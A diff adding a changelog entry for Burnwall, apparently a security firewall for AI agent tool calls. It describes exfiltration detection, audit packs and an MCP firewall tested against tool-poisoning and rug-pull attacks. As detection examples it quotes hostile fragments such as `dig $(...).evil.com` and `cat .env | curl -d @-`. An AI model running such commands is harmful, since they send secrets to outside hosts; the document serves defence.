@@ -2,6 +2,39 @@
 
 All notable changes to Burnwall.
 
+## [0.9.7] — 2026-06-07
+
+### Added
+
+- **Data-exfiltration technique detection** (opt-in, under `security.dlp`) — the
+  scanner now flags the exfiltration *method* in a tool-call argument, not just
+  secrets in the payload: DNS exfiltration (`dig $(...).evil.com`, encoded
+  subdomains), a secret file piped to the network (`cat .env | curl -d @-`), and
+  command-substituted uploads. Conservative/high-signal (a network tool alone is
+  fine) and names only the technique, never the data.
+- **`burnwall security --summary`** — a "what Burnwall caught for you" receipt:
+  blocks grouped by type over the window (pairs with `--days 7`), so passive
+  protection registers as ongoing value instead of going unseen.
+- **`burnwall audit pack`** — one-command compliance evidence pack: bundles the
+  signed hash-chained receipts, the CycloneDX 1.6 AIBOM, and the SARIF 2.1.0
+  security findings into a directory with a `MANIFEST.md` that maps each artifact
+  to the controls auditors ask for (ISO/IEC 42001, EU AI Act Art. 12/26, FINRA).
+  The artifacts already existed; this is one command + the framework mapping you
+  can hand a security team.
+- **MCP firewall is validated against the published attacks** — a test corpus
+  models the real PoCs (Invariant tool-poisoning / SSH-key exfiltration, the
+  MCPoison rug-pull that swaps a tool's behavior after approval, `<IMPORTANT>`
+  shadowing) so coverage is provable and stays covered.
+
+### Changed
+
+- README: a **Trust & privacy** section (local, zero-telemetry, read-only on
+  responses, signed single-binary releases, auditable "no network except
+  forwarding"), a **defense-in-depth** framing for security (rules run before
+  anything leaves your machine; complements — doesn't replace — native
+  controls), and the MCP scope note now points at the built-in `mcp-watch`
+  firewall (tool-poisoning + rug-pull detection).
+
 ## [0.9.6] — 2026-06-07
 
 ### Added
